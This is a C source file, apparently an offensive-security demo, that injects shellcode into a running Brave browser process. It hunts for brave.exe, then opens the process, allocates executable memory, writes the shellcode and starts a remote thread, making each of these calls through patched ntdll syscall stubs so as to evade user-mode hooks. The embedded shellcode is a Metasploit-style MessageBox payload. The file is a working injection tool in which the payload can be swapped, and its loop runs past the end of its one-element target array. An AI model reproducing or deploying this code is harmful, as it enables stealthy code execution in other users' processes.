#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include "injection.h"

void* banner() {

	printf("\n  Indirect Syscalls                     \n");
	printf("  Author: somby0x55                       \n\n");
	printf("     ___                                  \n");
	printf("   <. o )                                 \n");
	printf("     |  l                                 \n");
	printf("     |  |                                 \n");
	printf("     |  `'--___                           \n");
	printf("     |         `'--__                     \n");
	printf("     |  l       j    `'--//               \n");
	printf("      l  \\_____/     __-'                \n");
	printf("       `'.______---'`                     \n");
	printf("         |   |           _____            \n");
	printf("         |   |     ____-(     )_          \n");
	printf("    __-nm'--mm----/      `--____)         \n");
	printf("  //                                      \n\n\n");
	return;
}

int injector() {

	int targetpid = 0;
	int compareResult = 0;
	PROCESSENTRY32 pe32;
	void* hProcess = NULL;
	void* hThread = NULL;
	OBJECT_ATTRIBUTES objectAttributes;
	InitializeObjectAttributes(&objectAttributes, NULL, OBJ_INHERIT, NULL, NULL);
	CLIENT_ID clientID;
	SIZE_T writtenSize = NULL;
	void* allocatedAddress = 0;

	wchar_t targetExe[1][20] = { L"brave.exe" };

	//message box payload
	unsigned char shell[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
		"\x51\x41\x50\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60"
		"\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7"
		"\x4a\x4a\x48\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02"
		"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51"
		"\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
		"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
		"\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49"
		"\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
		"\x4d\x31\xc9\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
		"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
		"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
		"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
		"\x58\x41\x58\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41"
		"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
		"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
		"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
		"\x00\x00\x00\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d"
		"\x20\x4d\x53\x46\x21\x00\x5a\xe8\x0b\x00\x00\x00\x4d\x65"
		"\x73\x73\x61\x67\x65\x42\x6f\x78\x00\x41\x58\x48\x31\xc9"
		"\x41\xba\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41"
		"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c"
		"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59"
		"\x41\x89\xda\xff\xd5";


	SIZE_T allocatedSize = sizeof(shell);

	//snapshot processes
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == NULL) {
		printf("\n(!) Error snapping processes - %lu'", GetLastError());}
	pe32.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hProcessSnap, &pe32);

	//process checker loop
	do {
		for (int i = 0; i < 2; i++) {
			compareResult = wcscmp(targetExe[i], pe32.szExeFile);
			if (compareResult == 0) {
				printf("\n\n(+) Found target process %ls: %d", pe32.szExeFile, pe32.th32ProcessID);
				break;
			}
		}

	if (compareResult == 0) {
			targetpid = pe32.th32ProcessID;
			break;
		}

	} while (Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);

	if (targetpid != 0) {

		clientID.UniqueProcess = (HANDLE)targetpid;
		clientID.UniqueThread = NULL;

		patchFunc("ntdll.dll", "NtOpenProcess");
		NTSTATUS openStatus = patchedFunction(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientID);
		if (openStatus != 0) {
			printf("\n\n(!) Error opening process - 0x%x\n", openStatus);
			return 1;
		} else {
			printf("\n(+) Process opened successfully. Checking errors :%lu\n", GetLastError());
		}
		
		patchFunc("ntdll.dll", "NtAllocateVirtualMemory");
		FARPROC open = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
		NTSTATUS allocateStatus = patchedFunction(hProcess, &allocatedAddress, 0, &allocatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (allocateStatus != 0) {
			printf("\n\n(!) Error allocating memory - 0x%x\n", allocateStatus);
			return 1;
		} else {
			printf("\n(+) Memory allocated successfully. Checking errors :%lu\n", GetLastError());
		}
		
		patchFunc("ntdll.dll", "NtWriteVirtualMemory");
		FARPROC write = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
		NTSTATUS writeStatus = patchedFunction(hProcess, allocatedAddress, &shell, sizeof(shell), &writtenSize);
		if (writeStatus != 0) {
			printf("\n\n(!) Error writing memory - 0x%x\n", writeStatus);
			return 1;
		} else {
			printf("\n(+) Memory written successfully. Checking errors :%lu\n", GetLastError());
		}
		
		patchFunc("ntdll.dll", "NtCreateThreadEx");
		NTSTATUS createStatus = patchedFunction(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)allocatedAddress, NULL, NULL, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
		if (createStatus != 0) {
			printf("\n\n(!) Error creating thread - 0x%x\n", createStatus);
			return 1;
		} else {
			printf("\n(+) Thread created successfully. Checking errors :%lu\n", GetLastError());
		}
	}

	else {
		printf("\n\n(!) Error pid was 0 - %lu\n", GetLastError());
	}
	
	return 0;
}
